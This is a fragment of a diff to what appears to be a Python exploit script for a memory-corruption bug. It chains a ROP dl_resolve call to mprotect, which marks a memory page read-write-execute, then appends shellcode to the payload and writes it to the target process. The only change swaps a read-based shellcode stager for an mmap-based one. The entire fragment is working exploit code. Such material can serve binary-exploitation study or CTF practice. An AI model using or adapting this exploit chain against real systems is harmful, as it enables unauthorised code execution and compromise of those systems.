@@ -17,7 +17,7 @@ print "[+] read: %r" % p.read(len(buf))
 
 buf = rop.dl_resolve(addr_stage, 'mprotect', addr_stage & ~0xFFF, 0x1000, 7, retaddr=addr_stage+61)
 print "[+] offset to shellcode: %d" % len(buf)
-buf += sc.get('read_stager')
+buf += sc.get('mmap_stager')
 buf += rop.fill(100, buf)
 
 p.write(buf)
